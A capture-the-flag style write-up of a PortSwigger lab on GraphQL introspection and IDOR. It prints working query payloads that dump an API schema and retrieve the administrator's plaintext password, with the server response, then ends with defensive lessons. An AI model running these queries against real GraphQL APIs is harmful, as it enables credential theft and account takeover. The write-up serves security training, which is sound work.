# Accidental exposure of private GraphQL fields — (PortSwigger — Practitioner)
**Date:** 2026-08-08
 
---
 
## Vulnerability / core concept
GraphQL Information Disclosure with IDOR

---


## Payload / key command
When we load the home page of this web application we can notice `/graphql/v1` endpoint. First, thing is to use a probe JSON body to see if introspection enabled in production environment:
```js
{
    "query": "{__schema{queryType{name}}}"
}
```
From response we can see that it is enabled. Therefore, we can use the following query for information disclosure about GraphQL scheme:
```js
{
  "query": "query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description args { ...InputValue } locations } } } fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef } } fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue } fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name } } } }"
}
```
After sending this request we get full GraphQL scheme information. Analyzing it reveals multiple sensitive types and queries: `getUser` query which accepts id as an argument, `user` type with `id`, `username`, `password` fields.

These findings help us build a query that will return data about users with their usernames, passwords and ids:
```js
{
  "query": "query { getUser(id: 1) { id username password } }"
}
```
The response for this request is:
```js
{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "xpj1p6nxv6k86ymy6ctk"
    }
  }
}
```
Now, we can log in as administrator and delete user `carlos` to solve this lab.

As you can see, having introspection enabled in production environment can lead to severe information disclosure. Moreover, this application is vulnerable to access control (IDOR) that lets any user to request data about other users just by providing an id. Passwords are also stored in plain text, which should be hashed as best practice.
